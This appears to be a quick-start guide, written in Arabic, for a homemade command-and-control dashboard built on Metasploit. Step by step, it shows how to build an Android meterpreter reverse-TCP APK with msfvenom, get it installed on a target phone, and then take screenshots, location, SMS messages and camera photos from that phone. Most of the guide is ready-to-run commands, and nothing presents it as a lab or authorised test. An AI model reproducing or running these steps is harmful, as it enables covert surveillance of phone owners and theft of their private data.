# 🚀 QUICK START - البدء السريع

## تشغيل سريع في 3 دقائق!

---

## ⚡ الخطوات السريعة

### 1️⃣ التثبيت (مرة واحدة فقط)

```bash
chmod +x setup.sh
./setup.sh
```

### 2️⃣ تشغيل Metasploit RPC

```bash
# في terminal منفصل:
msfrpcd -P msf_password -S -a 127.0.0.1

# اترك هذا Terminal مفتوحاً!
```

### 3️⃣ تشغيل C2 Dashboard

```bash
# في terminal آخر:
python3 c2_server.py
```

### 4️⃣ فتح Dashboard

```
🌐 افتح المتصفح على:
http://localhost:5000

🔐 كلمة المرور:
hamza_sku_2026
```

### 5️⃣ إعداد Handler

```
في صفحة Setup:
├── LHOST: 0.0.0.0
├── LPORT: 4444
└── PAYLOAD: android/meterpreter/reverse_tcp

→ اضغط: 🚀 START HANDLER
```

### 6️⃣ إنشاء Payload

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP \
  LPORT=4444 \
  -o payload.apk
```

### 7️⃣ تثبيت على الهاتف

```
1. انقل payload.apk للهاتف
2. ثبّت التطبيق
3. افتح التطبيق
4. سيتصل تلقائياً! 🎯
```

### 8️⃣ التحكم

```
في Dashboard:
→ سيظهر Target في الجدول
→ اضغط على Target
→ استخدم Quick Modules أو Terminal
→ نفّذ الأوامر!
```

---

## 🎯 أمثلة سريعة

### معلومات النظام:
```
sysinfo
```

### لقطة شاشة:
```
screenshot
```

### الموقع:
```
run post/multi/gather/geolocate
```

### الرسائل:
```
dump_sms
```

### تحميل ملف:
```
download /sdcard/DCIM/Camera/photo.jpg
```

---

## ⚠️ استكشاف الأخطاء السريع

### لا يعمل Dashboard؟
```bash
# تأكد من Metasploit RPC يعمل:
ps aux | grep msfrpcd

# إذا لم يكن يعمل:
msfrpcd -P msf_password -S -a 127.0.0.1
```

### لا يظهر Target؟
```bash
# تأكد من Handler يعمل في Setup
# Status يجب أن يكون: RUNNING

# تأكد من Payload متصل
# في Dashboard → يجب أن يظهر تلقائياً
```

### Payload لا يتصل؟
```bash
# تأكد من:
1. IP صحيح (ليس 127.0.0.1)
2. المنفذ مفتوح في Firewall
3. الهاتف في نفس الشبكة
4. التطبيق يعمل على الهاتف
```

---

## 📁 بنية المشروع

```
hamza_sku_metasploit_c2/
├── c2_server.py          # Backend الرئيسي
├── templates/
│   ├── login.html        # صفحة Login
│   ├── setup.html        # إعداد Handler
│   ├── dashboard.html    # عرض Targets
│   └── session.html      # التحكم بـ Session
├── downloads/            # الملفات المحملة
├── requirements.txt      # المكتبات
├── setup.sh             # سكريبت التثبيت
├── README.md            # دليل شامل
└── QUICKSTART.md        # هذا الملف
```

---

## ✅ Checklist

```
□ Metasploit مثبّت
□ Python 3 مثبّت
□ المكتبات مثبّتة (./setup.sh)
□ msfrpcd يعمل
□ Dashboard يعمل (python3 c2_server.py)
□ سجلت دخول بنجاح
□ Handler يعمل (Status: RUNNING)
□ Payload جاهز
```

---

## 🔥 جاهز للعمل!

**الآن لديك C2 Dashboard احترافي حقيقي يعمل مع Metasploit!**

للحصول على المزيد من التفاصيل، اقرأ **README.md** الكامل.

---

**Made with 🔥 by HAMZA SKU**
**Version: 1.0.0 - Professional Edition**
